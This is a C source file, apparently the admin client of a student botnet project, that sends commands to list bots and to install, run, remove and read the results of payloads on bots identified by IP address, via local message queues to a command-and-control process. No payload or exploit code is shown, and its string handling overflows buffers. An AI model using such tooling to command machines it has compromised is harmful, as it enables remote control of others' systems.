#include "admin.h"


void handler(int sig){
	if (sig==SIGINT){
		destructionFileIPC(msgid2);
		exit(SIGINT);
	}
}



int main(int argc, char *argv[]){

	char instructions[]="\n./admin LIST to ask bots list and somes information\n./admin INSTALL to install a payload on a bot\n./admin RUN to run a payload on a bot\n./admin RESULT to ask the result of an execution\n./admin DELETE to remove a payload from a bot\n./admin QUIT to disconnect a bot\n./admin STAT to get the status of a bot\n";

	if (argc!=2){
		printf("Error args");
		printf("%s\n",instructions);
		exit(0);
	}

	int type;
	if(strcmp(argv[1],"LIST")==0)
		type = 2;
	else if(strcmp(argv[1],"INSTALL")==0)
		type = 3;
	else if(strcmp(argv[1],"RUN")==0)
		type = 4;
	else if(strcmp(argv[1],"RESULT")==0)
		type = 5;
	else if(strcmp(argv[1],"DELETE")==0)
		type = 6;
	else if(strcmp(argv[1],"QUIT")==0)
		type = 7;
	else if(strcmp(argv[1],"STAT")==0)
		type = 8;
	else if(strcmp(argv[1],"HELP")==0){
		printf("%s\n",instructions);
		exit(EXIT_SUCCESS);
	}
	else{
		printf("Error command \nTry this\n");
		printf("%s\n",instructions);
		exit(EXIT_SUCCESS);
	}

	action.sa_handler = handler;
  sigset_t ens;
	initSIGINT(ens);

	//Création file de messages admin
 	msgid2 = FileIPC_create(key_admin);
	if(msgid2<0){
			exit(EXIT_FAILURE);
	}
	printf("Message thread admin ID : %d\n", msgid2);

  //Récupération file de messages C&C
	msgid1 = FileIPC_get(key_candc);
	if(msgid1<0){
			destructionFileIPC(msgid2);
			exit(EXIT_FAILURE);
		}
	printf("Message thread C&C ID : %d\n", msgid1);

	//Conversion de l'ID de la file de messages de l'admin : int en char *
	char msgid2_char[SIZE_BUF];
  sprintf(msgid2_char, "%d", msgid2);

	//Envoi de confirmation de connexion de l'admin à la file du C&C
  envoiIPC(msgid1, ADMIN_CONNECTED, msgid2_char);

  //Réception de la confirmation de connexion du C&C à la file de l'admin
	data_t message_rcv;
  message_rcv = receptionIPC(msgid2, CANCC_CONNECTED);



	switch(type){

		case 2 ://demande la liste
			  envoiIPC(msgid1, type, argv[1]);
				break;

		case 3 : {
				//installe une charge
				char host[SIZE_HOST];
				char lib[SIZE_LIB];
				printf("\n");
				printf("Install a payload :\n");
				printf("Enter bot's IP address\n");
				scanf("%s",host);
				printf("Enter payload's name\n");
				scanf("%s",lib);

	      envoiIPC(msgid1, type, host);
				envoiIPC(msgid1, type, lib);
				break;
		}

		case 4 : {
				//execute une charge
				char host[SIZE_HOST];
				char lib[SIZE_LIB];

				printf("\n");
				printf("Run a payload :\n");
				printf("Enter bot's IP address\n");
				scanf("%s",host);
				printf("Enter payload's name\n");
				scanf("%s",lib);

				envoiIPC(msgid1, type, host);
				envoiIPC(msgid1, type, lib);
				break;
			}

		case 5 : {
				//demande le resultat d'une charge
				char host[SIZE_HOST];
				char index[1];

				printf("\n");
				printf("Result of an execution :\n");
				printf("Enter bot's IP address\n");
				scanf("%s",host);
				printf("Enter running index\n");
				scanf("%s",index);

				envoiIPC(msgid1, type, host);
				envoiIPC(msgid1, type, index);
				break;
			}

		case 6 : {
				//supprimer une charge
				char host[SIZE_HOST];
				char lib[SIZE_LIB];

				printf("\n");
				printf("Remove a payload from a bot :\n");
				printf("Enter bot's IP address\n");
				scanf("%s",host);
				printf("Enter payload's name\n");
				scanf("%s",lib);

				envoiIPC(msgid1, type, host);
				envoiIPC(msgid1, type, lib);
				break;
			}

		case 7 : {
				//quitter un bot
				char host[SIZE_HOST];
				printf("\n");
				printf("Disconnect a bot :\n");
				printf("Enter bot's IP address\n");
				scanf("%s",host);

				envoiIPC(msgid1, type, host);
				break;
			}

		case 8 : {
				//etat d'un bot
				char host[SIZE_HOST];

				printf("\n");
				printf("Get bot's status :\n");
				printf("Enter bot's IP address\n");
				scanf("%s",host);

				envoiIPC(msgid1, type, host);
				break;
			}

	}


  //Réception du résultat de l'exécution de la commande
  message_rcv = receptionIPC(msgid2, 0);

	switch(message_rcv.type){
		//affichage liste bot
		case 10:
			while(strcmp(message_rcv.buf,"fin")!=0){
				message_rcv = receptionIPC(msgid2, 0);
			}
			break;



	 case 13: {

		 	//affichage resultat execution
			char chemin[]="../candc/resultats/";
			char result[T_NAME];
			strcpy(result,message_rcv.buf);
			if(strcmp(result,"Error, wrong index\n")!=0 && strcmp(result,"Error, check if the bot is connected or if the ip address is correct\n")!=0){
				strcat(chemin,result);
				printf("Content of the result:\n\n");
				if (fork()==0) execlp("cat","cat",chemin,NULL);
				wait(NULL);
		  }

			break;
		}


	}
  	//Destruction de la file IPC (2) de l'admin
  	destructionFileIPC(msgid2);
}
